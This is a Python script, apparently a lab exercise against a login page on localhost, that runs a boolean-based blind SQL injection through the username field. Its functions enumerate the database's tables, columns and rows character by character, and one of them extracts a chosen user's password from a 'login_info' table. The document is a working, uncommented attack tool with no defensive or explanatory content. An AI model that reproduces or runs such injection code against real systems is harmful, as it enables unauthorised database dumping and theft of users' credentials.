import requests


def getNumberOfTables():

    payload = {
        "username": "",
        "password": ""
    }
    status = ""
    numberOfTables = 0

    while(status != "Success"):
        payload["username"] = "' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) = {}-- ".format(
            numberOfTables)
        r = requests.post("http://localhost:8888/", data=payload)
        status = r.content.decode("utf-8")
        numberOfTables += 1

    print("Number of tables: " + str(numberOfTables - 1))


def getNamesOfTables(numberOfTables):

    payload = {
        "username": "",
        "password": ""
    }

    for i in range(numberOfTables):
        length = 1
        name = ""
        status = ""

        while(status != "Success"):
            payload["username"] = "' OR (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name LIMIT {},1) = {}-- ".format(i, length)
            r = requests.post("http://localhost:8888/", data=payload)
            status = r.content.decode("utf-8")
            length += 1
        length -= 1

        for j in range(length):
            numberOfAsciiCharacters = 128

            for k in range(numberOfAsciiCharacters):
                payload["username"] = "' OR (SELECT ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name LIMIT {}, 1), {}, 1))) = {}-- ".format(i, j + 1, k)
                r = requests.post("http://localhost:8888/", data=payload)
                status = r.content.decode("utf-8")

                if(status == "Success"):
                    character = chr(k)
                    name = name + character
                    break

        print("Name of table: " + name)


def getNumberOfColumns(tableName):

    payload = {
        "username": "",
        "password": ""
    }
    status = ""
    numberOfColumns = 0

    while(status != "Success"):
        payload["username"] = "' OR (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=database() and table_name='{}') = {}-- ".format(
            tableName, numberOfColumns)
        r = requests.post("http://localhost:8888/", data=payload)
        status = r.content.decode("utf-8")
        numberOfColumns += 1

    print("Number of columns: " + str(numberOfColumns - 1))


def getNamesOfColumns(numberOfColumns, tableName):

    payload = {
        "username": "",
        "password": ""
    }

    for i in range(numberOfColumns):
        length = 1
        name = ""
        status = ""

        while(status != "Success"):
            payload["username"] = "' OR (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() and table_name='{}' ORDER BY column_name LIMIT {},1) = {}-- ".format(tableName, i, length)
            r = requests.post("http://localhost:8888/", data=payload)
            status = r.content.decode("utf-8")
            length += 1
        length -= 1

        for j in range(length):
            numberOfAsciiCharacters = 128

            for k in range(numberOfAsciiCharacters):
                payload["username"] = "' OR (SELECT ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() and table_name='{}' ORDER BY column_name LIMIT {}, 1), {}, 1))) = {}-- ".format(tableName, i, j + 1, k)
                r = requests.post("http://localhost:8888/", data=payload)
                status = r.content.decode("utf-8")

                if(status == "Success"):
                    character = chr(k)
                    name = name + character
                    break

        print("Name of column: " + name)


def getNumberOfRows(tableName, columnName):

    payload = {
        "username": "",
        "password": ""
    }
    status = ""
    numberOfRows = 0

    while(status != "Success"):
        payload["username"] = "' OR (SELECT COUNT({}) FROM {}) = {}-- ".format(columnName, tableName, numberOfRows)
        r = requests.post("http://localhost:8888/", data=payload)
        status = r.content.decode("utf-8")
        numberOfRows += 1

    print("Number of rows: " + str(numberOfRows - 1))

def getColumnData(tableName, columnName, numberOfRows):

    payload = {
        "username": "",
        "password": ""
    }

    for i in range(numberOfRows):
        length = 1
        data = ""
        status=""

        while(status != "Success"):
            payload["username"] = "' OR (SELECT LENGTH({}) FROM {} ORDER BY {} DESC LIMIT {},1) = {}-- ".format(columnName, tableName, columnName, i, length)
            r = requests.post("http://localhost:8888/", data=payload)
            status = r.content.decode("utf-8")
            length += 1
        length -= 1

        for j in range(length):
            numberOfAsciiCharacters = 128

            for k in range(numberOfAsciiCharacters):
                payload["username"] = "' OR (SELECT ASCII(SUBSTRING((SELECT {} FROM {} ORDER BY {} DESC LIMIT {}, 1), {}, 1))) = {}-- ".format(columnName, tableName, columnName, i, j + 1, k)
                r = requests.post("http://localhost:8888/", data=payload)
                status = r.content.decode("utf-8")

                if(status == "Success"):
                    character = chr(k)
                    data = data + character
                    break

        print(data)

def getPassword(username):
    columnName = "password"
    columnName2 = "username"
    tableName = "login_info"

    payload = {
        "username": "",
        "password": ""
    }
    length = 1
    password = ""
    status=""

    while(status != "Success"):
        payload["username"] = "' OR (SELECT LENGTH({}) FROM {} WHERE {} = '{}' LIMIT 1) = {}-- ".format(columnName, tableName, columnName2, username, length)
        r = requests.post("http://localhost:8888/", data=payload)
        status = r.content.decode("utf-8")
        length += 1
    length -= 1

    for j in range(length):
        numberOfAsciiCharacters = 128

        for k in range(numberOfAsciiCharacters):
            payload["username"] = "' OR (SELECT ASCII(SUBSTRING((SELECT {} FROM {} WHERE {} = '{}' LIMIT 1), {}, 1))) = {}-- ".format(columnName, tableName, columnName2, username, j + 1, k)
            r = requests.post("http://localhost:8888/", data=payload)
            status = r.content.decode("utf-8")

            if(status == "Success"):
                character = chr(k)
                password = password + character
                break
    print("Password: " + password);
